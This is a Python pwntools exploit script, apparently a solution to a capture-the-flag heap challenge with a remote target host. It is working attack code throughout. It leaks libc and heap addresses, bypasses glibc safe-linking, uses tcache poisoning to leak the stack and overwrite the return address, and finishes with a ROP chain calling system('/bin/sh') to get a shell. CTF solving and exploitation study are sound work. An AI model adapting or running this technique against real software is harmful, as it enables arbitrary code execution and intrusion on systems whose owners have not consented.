#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    b *main+271
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def alloc(idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendlineafter(b'> ', str(size).encode())
    io.sendafter(b'> ', data)

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(idx).encode())



def exploit():
    global io
    io = initialize()
    with log.progress('Leak heap & libc'), context.silent:
        io.sendlineafter(b'> ', b'anythin') # Alloc 0x409
        for i in range(1, 5):
            alloc(i, 0x18, b"A") #Guard

        free(0) # Unsorted bin
        alloc(0, 0x18, b"A") # Re-alloc unsorted bin

        free(1) # Free guard
        free(2) # Free heap target so 2 bytes more length
        alloc(2, 0x18, b"A") # Re-alloc heap target

        show(0)
        libc_leak = u64(io.recv(8)) & ~0xff
        libc.address = libc_leak - (libc.sym['main_arena'] + 1088)

        show(2)
        heap = demangle(u64(io.recv(8))) & ~0xfff
    log.info(f'Libc leak: %#x', libc_leak)
    log.info(f'Libc base: %#x', libc.address)
    log.info(f'Heap base: %#x', heap)
    with log.progress('Heap grooming & tcache poisoning leak stack'):
        alloc(1, 0x18 + 1, b"A"*0x18 + b"\x31")
        free(4)
        free(3)
        free(2)
        alloc(2, 0x28, b"A"*0x18 + p64(0x21) + p64(mangle(heap, libc.bss() - 0x10))) #Target libc.bss() - 0x10 to align chunk
        alloc(3, 0x18, b"A")
        alloc(4, 0x18, b"\x00")
        show(4)
        io.recv(0x10)
        stack_leak =  u64(io.recvline().strip().ljust(8, b'\x00'))
        rbp =  stack_leak - 0x120 - 0x8 
    log.info(f'Stack leak: %#x', stack_leak)
    log.info(f'Return address: %#x', rbp)

    with log.progress('Tcache poisoning 2 times to the ret target with ret2system'):
        rop = ROP(libc)
        rop.system(next(libc.search(b"/bin/sh\x00")))

        #RBP + RET
        free(0)
        free(3)
        free(2)
        alloc(2, 0x28, b"A"*0x18 + p64(0x21) + p64(mangle(heap, rbp)))
        alloc(0, 0x18, b"A")
        alloc(3, 0x18, p64(rop.ret.address)*2)

        #RET + 0x8 and RET + 0x10
        free(1)
        free(0)
        free(2)
        alloc(2, 0x28, b"A"*0x18 + p64(0x21) + p64(mangle(heap, rbp + 0x10)))
        alloc(0, 0x18, b"A")
        alloc(1, 0x18, rop.chain())
        io.sendlineafter(b'> ', b'4') #Get shell

    io.interactive()

if __name__ == '__main__':
    exploit()
